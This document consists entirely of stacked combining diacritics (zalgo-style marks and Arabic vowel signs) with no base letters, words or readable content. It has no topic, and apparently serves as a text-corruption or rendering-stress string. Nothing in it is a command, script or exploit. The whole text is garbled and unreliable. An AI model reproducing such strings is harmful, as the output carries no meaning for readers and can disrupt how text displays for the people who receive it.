ٌٍِ̛͇̍ͧ̚͏̸̶̷̴̷̷̴̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̧̨̛̫̱͎̭͖̻̝̯͈̖̼̣̼̙͎̬̤͎̖̺͉̯͌̀̑ͩͮ̑̏̈̑ͫ̇̇ͫͧ̀̋ͯͦͧ̄͌ͫ͌̉̑̽͋̄̐͑͘̚͘͘͘͘͢͢͡͠͝͏̴̴̶̶̷̷̴̴ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̡̢̡̧̭̙̞̣̠͖͍̰͖͈͍͎̣̪̦ͩ̄̌̔͂͊̈́͋̽̏̿̆͊̈̾̅ͪ̕͘͘͟͟͠͠҉ًٌٌٍٍَُُِِّ̨̟̰̼̳ͧ̈́̀ͯ̇̓̊ͣ̈́̄͢͟͢͏ًًٌٍََُِّّ̪͓̝ͦͬͪ͂̕͞ͅ҉̵̶̴̵̸̸̷̷̶ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̢̡̧̢̢̧̧̢̺̥̰̱̗̤̩̰͙̗͔̲̘̦͚̦͓̼̞͈̟̤̍́̽ͨ̌̈͛ͥͥ̂ͭͭ͗͌̅͋̀͋ͪͩ̏̾ͭ̍̌͒͋ͩ̍̋ͣ̍̉ͧͭ̕͜͟͟͟͝͠͞͡͞ͅͅͅ҉َّͭ͏̵̴̸̶̶̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̡̢̡̨̡̜̻̼̺̩͖̠̠̖̺̼̜͎̤͕̩͖̦̫͕͕̬̖͐ͦ̎̍ͤ͋͛̊̆̓̈́̋̋ͩͭͥ̉́̉̓ͤ̅̑̑̉͐̾́̎̃͒͗͘͘͢͟͟͡͝͝҉̴̵ًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̡̢̡̨̡̲͚͖̗̺̺̘̞͕̲̺͎̠ͥ̓ͫ̐́͐́̅ͣͩ̈́ͬ̒̀̈́͢͜͠҉ًٌٍَُِّ͉̬͖́ͩ͝҉̶ًٌٍُِّ̢̗̾̊҉̸̶ًًًٌٌٌٍٍَََُُُِِِّّ̧̡̨̼̥̗̙̼̱͈̻͓ͤͨͩ͆ͯͭͯͩ̀̓ͮ͑͘͜͜͢͟͞ͅ͏ٍ̟̎҉ّ͍҉̷̵ًًًٌٌٌٍٍَََُُُِِّّ̧̧̛̛͉͎̲͔̗͎͉̙̙͔̞̏͗̽́̆͒̚̚͘͡͠҉̷̵̵̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̢̢̧̡̧̛͍̹͙̘̳̟͉̖̗̭̪͓͖͔͖͕̭͈̹̬͍̦̦͍̥̦̰̪̳͇͍͖̓̀̅ͭ̌ͣ̏́ͬ̋̏̓̎ͤ̀̈́͗ͭ̽ͨͤ̂̉̾́̾̈́̐̆ͨ̏͒̉̍̎̑ͯ̀͘͘̚̚͜͜͜͢͟͜͠͝͡͡͠͡͏ًًٌٌٍٍٍََُُِِِّّّ̡̮̻͖̥̠̙͍̫͕͉̾ͧ͌ͯ̿́ͫ̅̃̓̔͢͢͝͠͏̵ًًًٌٌٌٍٍَََُُُِِّّ̢̳͕̞̜̳̮̺͊ͫ̿̂ͯͤ̽ͧ͘͜͜͞͡͏̷̸ًًٌٍٍََُِِّّ̡̺͕̳̥̻̒ͪ̃̓ͪ̾̊͘͟͢͏̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̢̢̢̧̨̛͚̠͍͉̼̗̼̘̥̘̳͚̣̘̠̣̥̺͍̥̥̝̝̦̣̱̬̿̀̋̄͂ͫͨ͆̈́͗̌ͩ̋̓ͤ͗ͮ̔ͦͨ͊̂̄̋̊̋͛͑̾ͫ́ͬ͋̀̇͘͘̕̕̚͟͢͟͟͞͞͠͠͠͠͝͡͞҉ً҉ًًٌٌٍٍََُُِِّّ̻̮̝̬̥̉̃ͬ̃́͠͠҉ٌٍَُِّ̧̰͚̱̫̫̃͝͏̶ًٌُ̣̤̆҉̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̨̱̥̱͍̪̮̘̣̜̙̖̗͈̪̠̤͑ͬ̓͐ͣ̉ͩͩ͗ͭ̉ͦ̋ͨ̔̾͆̕͘͢͟͜͞͞͝͡͞҉̵̶̷̷̸̶̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̡̡̨̡̡̧̛̛̥͎̘̠̟͇̘͇̝̥͖̤̩̲̼̮̰͕̲͕̲͖̲̰̝̠̥̳̮̋̂̃̈͐͑̑ͬͥ͂̍̈̀ͨͥͭ̽ͤ̃́̄̄̐ͧ̀̽ͮ͊̚̕̕͜͢͝͠͞͡͞͝ͅͅͅ҉̷̴̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̡̨̨̟̥͚̯̜̻͙̰̘ͪ͂̽̐ͨͪ̋ͣͧ̀͗́ͭ͜͢͠҉̶̴̴̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̢̧̨̧̡̛̛̛͖͉̲͍̙̭̦̠͓͓̠̬͚̩̫͖̥̣̙͇̩̙̭̩͖͛͋̏̂̅͗͌ͮ̀͛̄̒̒ͭ̋̈́̇ͣͣ͘̕̕͢͢͟͜͞͞͠͡͞͏̸̷̵̷ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̡̧̡̛̲̠͕̲̰̘̲̥͔̳̟̳̭̲̜̱͋͒̔̐ͨ̿ͫ́̓͆ͧͭ́ͣͭ̊ͣ̄̕͟͟͝͝͡͝҉̴̴ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̡̧̡̡̛̱̱͔̯̖̳̘̘̯̹̥̝̝͛ͭ̆̂̀ͨ̄͐ͩ̇͊͌͌ͣ̍ͯ̀͘̕͟͢͜͠͠ͅ҉ًًٌٌٍٍََُُِِّ̙̝̤̘͓̥̳̆͋ͨ̃ͣ̑͘͘͢͝͏̷ًًٌٍََُُِّّ̡̮ͪ̏̓̐̉͟͠͏̵̴̴̵ًًٌٌٌٍٍٍََُُِِِّّّ̢̢̝͓͔̜̭̝͍̞̪̣ͪͪ̅̔̐͌̈́̆ͫ̌̎͠͏̸̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̧̢̢̘̳̮̙͙̳͚̺̺͖̹̬̘̘̦̖̖̩̟͔͖̰͐ͤ́̔̇̏̅ͤ͆̀̑́͋̈ͦͨ̈́̌ͩͨ̀̈̑͛̄̚̕̕͟͢͜͟͢͞͡͠͡҉̶ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̨̧̛̛̣̥̟̟̩̮̖̘̞̮͔̞͖͕̖̹̯̻̖͂̉͆̓͊̓ͧ́ͫͩ̂́͗͑͐ͧ͌̅̀̔͆̒ͤ̚̕͢͢͡͝͠ͅ҉̶̵̷ًًًٌٌٌٌٍٍٍَََُُُِِِِّّّ̨̧̛̘̭̙̺̥͙̺͎̼̪ͨͫͯ̀ͬ̓ͭ̄ͪͪͬ̚͜͞͠͞҉̶̵̷̴̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّ̡̡̮͕̩̣̬̘̟͉͖̺͓̺̙̼̝̜͉̀̉̄͂̿̒ͫ̉̽ͩ͊͑ͥͩ̽͘̚̚̕͞͠҉ًَُّ̡̤̑̀͏ًٌٍَِّ̛̣̱̮́͆́̔͏̶̶̴̷̷̷̸̴̵ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̢̧̢̨̧̧̛̛͍͙̬̻̟͙̙̼͓̲̹̭̪̯̱͎͚͇͓̮̼̜̻̱̥̖͈̯̪̹̼̦̺̗̯̭͖̞̭̭͉̃ͧ͋̀̀̀̊͌ͬ̇́̽ͤ͌͌̈́́̊̈́͗̀̋̀ͥ̈̋ͩͧ̍ͧ͋́̍ͫ̋͑̊͘͘̚͟͟͢͢͟͜͝͞͠͠͡ͅͅ҉̵̵̵̴̸ًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّ̡̡̢̨͎͕̘̖̞̤͕̳͕͍̟̹̫̦̮̬̱͉͈̖̪̲̠͉̞̫͕̖͕̼̰̰͇͔̙͖͔̟͈͔̞̟͑ͭͫ̏͋̊͑ͥ̍́́ͨ̃̎̋̃ͭͦ̌́͐́̄̊͛̎ͣ̀̊̍̅̄̋̀̏́̓ͬ̉̔̈͑ͦͬ̎̋̐̈̌̂͋͑͘̕̕͘̚̕͘͘̚̕͘̕̚͢͟͟͜͜͟͢͢͢͜͟͝͞͝͞͞͝͞͠ͅͅͅͅ͏̴̷̵̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧̢̢͖̱͍̜̥͓̬̜̞̭̰̮͌̑̈͋ͮͪ͋̒̅̀͊͘͜͠͡͏ًٌَُِ̜̙͇̹̅̊͏̴̷ًٌٍٍَُِّّ̢̫͑̿̈҉ًٌٍَُِ̧̅͘͝͏ًًٌٌٍََُُِّّ̡̡̙̱̤̬̑̓ͦ̆ͧ̕̕͜͝͠͏ًٍَُِّ̡͖̹̜͈̤ͪͬ͡͏ٌٍِ̧̲̩͔ͦ̀̿͏̵ًًٌٍََُُِّّ̧̣͙̙̺͊̋̒́̏̕͢͠҉ًًٌٌٌٍٍٍََُُِِِّّّ̢̡̢̛̛̛̠̦̗̖̠̗̬͚͎̖̐́̊̄͛̈́ͤͫ̓͘͏ًَ̳̣̔҉ًٌٌٍٍَُُِِّّ̡̧̨͇̞͍̙̩̩̇̓̾͛̑̉ͤ̕̕͝͝͏ًٌٍَُِ̠̭̻̽ͨ͘͟͏ًَّ̙ͯ҉̴̴̵̸ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̧̧̨̛̥̺͔͕̪͖̠̜̰̙̩̲̰̬͚̤͎̇ͪ́̈́̈̅̄̾ͯ͋̉̚͘͟͟͜͡͞ͅ͏̷̸ًًٌٌٍٍََُُِِّّ̧̨̨̯͔͚̱͙̬͉̎̊̆̆̀͐͊҉̸ًًًٌٌٍٍَََُُِِّّّ̡̨̛̰̜̗͓̟̣̪̮̓́͆͐̋ͥ̃͐̀̕͞͝҉ًٌٌٍٍَُُِِّّ̢̧̛̪̝̩̥̝ͮ͌̀̀͗̈́̚̕͟͢͞͞͞ͅͅ͏̵ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̡̡̢̧̡̛̩̭̼͖̺̠͔̜̰̼̖̺̥̮̯͖͓̪̩ͪ̂̏͊ͦͦͨ̏͐̆ͯͬ͜͢͡͡͝҉̸̶ًًٌٌٍٍََُُِِّّ̧̡̝̺̘̱̩̻̑̿͐̋ͬ̀̽ͯ̑̓͜͜͡҉̸ًٌٍَُِّ͙̯̆̾̓͘͞͝ͅ҉̵̶̴ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̧̢̢̢̡̛̛̲̟̫̞͔̗̮̯̦̖̹̠͔͈̳̹̟̼̎͆ͭ̇̃ͩ̀̀̎͐̅ͫ̀̄̏̐́̓ͤ̽̉́́̕͞͞͠͠͝͝҉̶̷̵̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̡̛̛̩̹̺̲͓͚̟̩̫͍̪̣̝͗̒̎ͤ̆̈́͂ͩͥͬ̇̍̌ͧ͘͘͢͞͡҉̵̶̶̶̶̶̷̸̶̸̸̸̷ًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̨̨̡̡̧̢̧̢̧̡̨̡̛̛̛̛̛̛͈̗̺͙͈͎͕̯̫̖̝͉̗͇̱̖̣͚̥̬͍͎̱̱̺̥̲̣̰̥̰̦̩̤̜̬͚̥̜̝̥̩̱̞̠̗͚̦̱̘̾͊͆̔̌ͧ̀́̉̓ͯ͑̾ͮ̇̊́̃ͨͮ̆ͨ́̌̓͛̃͂̒́͛ͧͭ̂̈́̌̓̀ͬͯ̋ͪ̿̑̀̈́̑̃͑̓́̑́̒́̀̂́͘͘̕͘͘̕̕͟͟͟͝͞͠͠͞͠͠ͅͅ҉ًًٌٍٍََُِِّّ̛͕̣̦̜̮̞̩̑̈́̇̊͌̈͞͡͏̴̶̵ًًٌٌٌٍٍٍََُُُِِِّّ̢̢̡̛̪̻͚͚̥̙̼ͪ͋ͬ́ͦ̎̅͒̃͂́ͤͥ͘͞ͅ҉̷̸̶̶̶̶ًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̧̢̧͉̘͚̟̻͕͖̤̮̞̼͉͔̀̇̓́̀̓̌̑̓̈́͊͌ͦ͗̂̓̈́ͩ̚ͅͅ҉ًٌُ̖̪͈̍҉̴̷̴̴̷̸̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِِّّّّّّّّ̡̢̡̨̜̹͇̗̟̞͕͇̙͈̠̼̖̘͕̙̪͚̰̣̭̣̞̣̦͈̞̫̝ͣͨͩ̀̊ͭ̃̉̿ͧ́̈͗̓ͩͬ͐̐ͦ͊͐̒̈̎̀̕͘͢͝͡͝͠͡ͅ͏̵̴̵ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̡̢̘̥̳̘̠̜̱̠̱̥̣̣̹̼̮̥ͤ́̈́̎̓̂̀̒͌̏̀ͦ͆͘͘̕͘͟͠͡͠͠҉̴ًًٌٍَُِّ̡̯̭̘̼̔ͯ͘͝҉̵ًٌٌٍٍَُُِِّ̢̘͈͍͇͍̋̉̀ͭ͐ͭ͘͝͏̶ًًًٌٌٌٍٍَََُُُِِِّّّ̨̨̢̧̳̜̞͚̣͎̖̻̗̣̭͒ͮ̔͑ͧ̀ͮ̃̌͒ͬ͢͠ͅ҉̷̵̶̶̸̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̧̢̠̱̜̗̻̗̰̗̖͈̣̩͕̜̤͈̩̗̤͎̹̦̞͍ͫͩ̏ͦͩͪ̾̀ͥ͊ͩ̿͆͒̀ͤ̂̽́́̂̇̓̓ͮ̑̀͑̕͘̚͢͜͟͢͠͝͝͞͡͞͠͠͏̷̴̷ًًٌٌٌٍٍََُُُِِّّ̢̡̧͉͍̼̮̪̦̹̬̤́̿͐̏̆̾̐̑͘͢͝͏̴̶̴̴̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̤͚̟̘̱͙̠̮̮̪͉̻̣̥̟͔͔̐ͨͭͦ̃̍ͤͬ̀̅̒̃̌̄ͧ͢͞͝͝҉ٌِ̽҉̷̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّّ̡̡̢̛̛̻̠͉̤͚͓͚̱̟̤͚̪̦̺͍ͮ̒͑ͪͧͬͥ͐̔̒ͮ̿̓̇̀̑ͮ͑ͮͦ͘͜͢͢͠͞͏̷̶̵̸̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̡̨̡̧̛͚̟͎̞̩̣̥̲̙̤̙̻͓̘̼̹̻͕͎̻̖̿̈́́̈́͊͗͛ͦ̽̅͊̏ͦ̃́̌̀͆̀͗̔͘̕͜͟͠͝͞ͅͅ͏ًًٌٍَُِّ̧̥̣ͭͣ̔́̾͟͝҉̶̵̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̡̧̢̢̧̧̧̨̡̧̛͖̻̗͓͕̗̮̯̪̩͕̥̹̪̜͉̦̺̼̺͒̀̐͊ͯ͂͆̐̽̓̓ͤͥ̌̀ͯ͊̈͂̑̔ͧ͘͟͜͠͞͞͡͝͏̸̶̷̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̢̧̢̛̭̥̟̘̜̹͎̤̝̣̦̘̜̘̯͖ͨ̍̆̓̽͆̏͛̂̋̑͐̍̉̀͗̀̕͢͜͞͠͝͡ͅ҉̴ًًٌٍََُِّ̡̤̘̠̤̮̽̽ͦ̀̑̊͛͞͏̶̷̴ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̢̧̨̡̥̩͓͎̖̱̭̻̳̭̜̙̼̲̫̜̳̗̝͓͍͓̜̖̺̪ͤ͌͌̒ͦ͑ͬͮ́̒̍̍̑ͬ̀́̒̇ͯ̾ͨ̆͑ͬͨͨͤͪ͘͘͟͢͞͝͝͞ͅ͏̸̴̵̸̷̷ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̡̨̛̞̭̞̟̱͕̲̤̙̼̦̹̹̯̟̙͈̰̘̻̻̭̯̲̫͓̆̑̄͋̌̓ͫͧ̅̿́̃ͥ̍ͪ́̎̇̀́ͬ̌ͨ̽̌ͯ́̈̌͌̓͊ͮ͘͘̚͜͝͠͝҉̶ٌٍُِ̟̆̀͐͏̸̷ًٌٍَُِّّ͚̼̺͈͑ͩ̿ͬ͆̀͡҉̵̷ًًًٌٌٌٍٍَََُُُِِِّّ̡̨̡̲͉͎̹͍̬͙̺͉͍̜̺ͦ͋̓͒̽ͩ̚͜ͅ҉ٍَّ͍̄͏̴̴̷̶̸ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̨̡̛̯̹̲̬̪̖̱̥̲̦̬̘̥̩̜͈͓̬̠̳̮̞ͭ̌̌̐̃ͧͭ͊ͬ̀ͪ̋ͦ̿̇ͩ̒̉͘͘̚͢͢͡͠͝͞͡ͅ͏̶̶ًٌٍَُُِّ̧̧̲͉̮̪̝ͪ̾̔̊̈̂̂͠҉̷ًٌٌٍَُِّ̡͙̠͖̜̀̇͐̈́̀͐͐͝͠҉̷̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̢̡̨̧̧̛͍̥͍̪̘̠̪̥̖̭͖̞̳̜͎̘̲ͬ͗͐̔ͯ͒̊ͭ̾͒̈̊͑́ͦ̀̓̕̚͝҉̸̴̴ًًٌٌٍٍََُُِِّّ̧̢̛͙̤͎͉͔̺͕͚̣ͦ́̉́͑̈́͡҉̶̵ًًًٌٌٍٍَََُُِِّّّ͎͓̱͇͙̠͍͍͌́̀͆̽͋́̾̕͜͝͡͡͝͏̸̴̶̵̵ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̨̡̧̢̧͚̝̪͔͓̪͍̣̣̫͉̻̺̬̼̬̥͍͎̝̺͌́̂ͤͤ́͂ͤ͌ͣͣ͌̀̓́̒̋͐͌̿͊͌ͤ̕͘͘̚̕͘͢͢͞͏̵ًًٌٌٍٍََُُِِّّ̢̠̺̟̩̹͕͋̀̓ͩͫ̿͒́͊͌͡͠͠҉ًًٌٌٍَُُِّ̢̛̹͎ͧ̔̉́̋̏͏̸ًٍَِّ͕̪̲͎͘͜͏ٌٍَُِّ̠̼͚̳̳̔͛́̕͠͝ͅ҉̶ًًًٌٌٌٍٍََُُُِِّّ̡̧̢̛̬̙̝͈̝̤̳̽̀͌̔̒͌͋̅ͫ̀͠҉̵̶ًًٌٌٍٍََُُِِّّ̛͙̲̞̜̠͈͈̜͚͖̀̋̊̎ͮ̒ͤ͒͢͜͠͡҉̷̵ًًًٌٌٍٍٍَََُُِِِّّّ̯͕̘͖͔̬̭̯̱̯̝̒͋̔̏̍̀̽ͪ̅͋͘̕͟͠͠҉ٌُ̜̞͌҉ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̧̨̡̨̡̡̢̰̠̜̮̤͇̱͙̭̖̩̣̖͍̙̟̭̼̏͆̍́̐͒̍̈̀̄̀̑̒̌̾ͭ̅̍͑̀̕̕̚͜͟͝҉̴̷̴̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّ̢͖̻̩͍̦̤̝̤͚̥̥̙͍̪͇̭̋ͮ͐̅ͯ̒͑́ͭͪ͒͂̍͛̐͘̚͟͟͢͟͠͝҉̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̧̧̡̨̹̺̱̩̞̺̮͇̲̤̤͖̦͍̩̫͕̝̅͗́̉͊͛̀̑̀̈͆̆́́ͬ͆̋ͭ̿̃̍̚͘͟͡͝ͅ͏ًًٌٌٌٍٍٍََُُِِِّّ̡̺͕̠̜͇͎̹̘̻͎̇͛͊̾̃͘̕͝͝҉̸ًٌٍَُِّّ̢̦͈̞̤͙ͨͣͫ̀͢͠͏̶ًًًٌٌٌٍٍَََُُُِِّّ̧̨̛̠̫̰̪̜̪̜̮͙ͧ̆̿̽̐͒ͨ̽̀́ͪ̈̂͛̕̚͜͞͏̸ًًٌٌٍٍََُُِِّّ͎̬̳̘̒̑ͪ̒̅͋ͣͭ̀͐̐̔͟͝҉̷̶̵̷ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̡̡̢̛̤̠͈͚̠͍͕̣̯̬͉̜̙͔̞̫̹̬̃ͣ̅͒̀ͩ̌̽̔́ͥ͑̇ͨ̔ͫ̈͂̄ͣ͜͢͢͝͝͞͞͡͝҉ٌُِ͈̾͞҉̵ًًٌٍٍََُُِّّ̢̛̫̥̣̙̘̗̂̐̅͂͒͆ͨ̾͟͏̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̧̨̢̧̧̛̱͕̩̻̟̣̘̻̺̜͓̰͍͚͍̼̰̟̯̹̼̮̈́́̾͋̂̍ͦ͐̎̌͒̒̎̂̉̋͒́͑ͣͣ̀̅̚͟͠͠͞͡͡͝ͅ͏ُ҉ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̧̛͙̙̗̗̬̲͈̞̫̝̯͇́̓ͣͫͪͫ̊̀̿̓́͊ͫ̀͘͢͟͜͡͏ًٌُ̤̿̀̀̀͏ٍِ̙̿҉ًًٌٍََُُِّّ̡͈̙̎ͥ̆̇̑̂̊͟ͅ҉̴̴̷ًًٌٌٍٍََُُِِّّ̖̮͕̫̖̪̜̹͔̭̓ͬ͊̾ͯ͒̿̂͊͝͠͏ٌٍِّ̘̞̰̉̕҉َ̾͏̵̵̷̸ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̛̦̹͍͓̥͙̱̟̝̦̖̜͖͖̞̱̦̯͉̻͖̤́̃ͧ̆̊̃̃̈́̇̋ͣͪ̀̀͊͆̅̀̀̕͜͢͟͠͠͡͏ُ̰҉̶̷̶̴̸̵̵̶̵̴̴̸̶̶̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̢̡̢̢̧̡̧̡̧̡̢̝̣̖͍͓̜͉͙̩͓͔̱̻͚̲̮͖̫̖͓̹̞̺̟̳͚̫̰̙̼̗͇̠̬̲̟̪̘̎̌ͩ̑̔͛͑̍̋̋̅͗̀̀̋̋͆̅ͨ́̇́ͦ̽ͯ͛͛̍̔̀́̓̅́̇͊̆͑̒͆͗̓̎̍ͥ̕͘̕͜͜͜͟͢͢͞͡͠͡͝͞҉̶ًٌُِ̛̱̝̔͏̴̵̶̵̸̷̴̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̧̨̡̡̨̛̩̺̦͙̺̙̯͉͚̰̮̺̹̫̞͔̙͕̺͇̥̦͈̭̘̹͙̺̪͔͚͉̬ͨͫͤͩͤ̊̋ͥ̾͆ͦ͑͊̅ͦͣ̓́͆ͫͭ́͆͂́͛ͣ͋́͆ͬͬ̈́̊ͫ̔̇́ͯͭ̾͘͘̕͘̚͘͢͡͡͡͠͞͝ͅ͏̷ًٌٌٍَُِِّ͙̫̰͔̘͑ͨ̀͑͏̵̷̵̵̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̛̛̝̮̩͔͓̱͍̪̖̝̭̗̺̝̯̝̪ͯͪ̔͆ͤͮ̿͛̅̈ͮ̀͋ͥ̒̍̅ͩ͘̕͘̚̕̕͟͜͟͝ͅͅ҉̷̶̵ًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̡̠̙̯̯̗̙̬͈̓̒ͨͭͪ̽̂̓ͩͯ͒̏̕͜͡͡͏̷̶̷̷̷̴̵̴̶̷̵̷̴̵̵ًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̡̡̨̨̨̢̢̨̡̢͍͉̟̣̺̬̬̰͖̮̗͚̩̠̼̲̗͎̯̣̪̪̼̝͙͙̱̤̖͉̝̙͚͉̱͍̭̰͉̹̼̟̻̜̪͍̪͇̳͍̇͊̈́ͦ͛̈́̅̐̽ͨ̽͛ͭ́̾ͧ̋̒ͨͦͨ̃̎̄ͫ̆͐͑ͣ̋̀̓̔̀́͊̍ͤ̐͑́̎̆̇͗͒̋͆̀̀͑͋̍ͪ̀̉̽̆̓̏̎͊̓́ͪͭ̕͘̚͘͟͟͜͜͢͟͟͢͢͟͝͞͡͞͠͝ͅͅ͏ًٌٌٍٍَُِِّّ̨̤̜̝̠̥̪̩͐́̉̓͂̔̕҉ًَ̎͂҉ٌٍُِ̮̰̹ͪ̾͏̸̵̷̷̶̴̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̨̡̧̧̧̛̛͇͎̱̫̠̙̫͕͙͓̤̘̗͉̜̮̲̪̮͕̝͙̺͓͉̠͚͇͔̭̲̫̦̪̦̅ͬͬ͆̽͆̑ͭ̀̈́̾ͥͣ̓̐̽̇̄ͣ̄͒̉̀͗́̓͂ͦ̓͘̚͢͢͢͜͜͞͞͠͠͠͝͝ͅ҉ًَُّ̺͈ͤ͛҉̴̵ًًٌٌٌٍٍََُُِِِّّ̨̫͈̺͍͖̙͔̰̇̌ͣ̃̊͋̔̋͘͡͏̸ًٌٍٍََُِّّ̢͓͈̟̞͍̊̽̈́ͫ͝ͅ҉̶ًٌٍَُِّ̡̛̣̤̘͖̭̮ͫ̇͑̈̐҉̵ًٌٍَُِّ̦̝͙̣̉ͯ̇̒̃̕͏̴ًًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̧̧̛̳̙̱̠͔͈̞͔̫̫͉̯͖͑́̄ͯ̽̀͆ͭ̅ͨ͋ͯ͒ͣ̅ͯ̚͘͞͠͏ًٌٍٍَُِِّ͉̭͔̺ͫ͐́́̕͜͞͏̴̴̷̵̸̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̢̨̡̢̛̯̹͇̲̦̝̼͕̣͙̞̲̟̘̞͙͙̳̱͕̀̓ͨ̿͌̿͂ͤ͒̍ͮ́̽̃ͣ͊ͯ̄ͮ̎͂ͬ́ͪ̽͘̕͘̕͢͟҉̴̶ًًًٌٌٍٍََُُِِّّ̨̧̘͚̦̮̫̻͔͇͎̼ͩ̒̾̀̍ͥ͟͜͝͏̸̴̴̵̴̸̷̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̨̧̢̧̨̨̨̡̧̨̛̳̪̙̗̦͓̩̫̪͙̖̦̗͙̤̞͈̠̼͉̠̖͓̱̠͔̺̭͕̬͕̭̱̞̘̞̼̱̮̫̄͋̈́̇͒͑́̇͒̉ͭ̀ͬ͗́̀́̂͑̓ͤ̈ͭ̅ͨ͒͛͌ͯͪ̐́̐̒͊̀̄̋ͭ̃̚͘̕͘͜͜͢͡͞͝͞͠͡ͅ҉̴ًًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̢͈̭͖̥͓̞̬̝̫̤̱̫̤̼̺̆̿͐̀̐͒̐̄́̂͟͟͝͡͝͞ͅ҉̶ًٌٌٍٍَُُِِّ̞̣̦̳ͧ́ͣ̿̕̕͜